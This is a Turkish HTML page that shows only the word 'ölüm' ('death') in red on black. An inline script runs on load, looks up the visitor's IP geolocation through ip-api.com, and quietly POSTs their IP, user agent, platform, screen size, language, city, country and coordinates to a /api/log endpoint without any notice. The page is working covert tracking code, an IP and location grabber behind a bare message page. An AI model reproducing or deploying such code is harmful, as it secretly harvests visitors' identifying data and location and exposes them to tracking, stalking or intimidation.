<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ölüm</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: black;
      color: red;
      font-size: 50px;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>
  ölüm

  <script>
    
    async function getIPLocation() {
      try {
        const res = await fetch('http://ip-api.com/json/'); 
        const data = await res.json();
        // ip-api dönen örnek JSON (başarılı sonuç için "status": "success" olmalı)
        // {
        //   "status": "success",
        //   "country": "Turkey",
        //   "countryCode": "TR",
        //   "region": "34",
        //   "regionName": "Istanbul",
        //   "city": "Istanbul",
        //   "zip": "34000",
        //   "lat": 41.0138,
        //   "lon": 28.9497,
        //   "timezone": "Europe/Istanbul",
        //   "isp": "TTNet A.S.",
        //   "org": "Turk Telekomunikasyon Anonim Sirketi",
        //   "as": "AS9121 TURK TELEKOMUNIKASYON ANONIM SIRKETI",
        //   "query": "X.X.X.X"
        // }
        return data;
      } catch (error) {
        console.error("IP konum verisi alınırken hata oluştu:", error);
        return null;
      }
    }

    async function sendData() {
      const ipData = await getIPLocation();

      
      let userData = {
        ip: ipData?.query || "Bilinmeyen IP",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        location: ipData && ipData.status === "success"
          ? `${ipData.city}, ${ipData.country}`
          : "Konum alınamadı",
        latitude: ipData?.lat || null,
        longitude: ipData?.lon || null
      };

     
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });
    }

    
    sendData();
  </script>
</body>
</html>
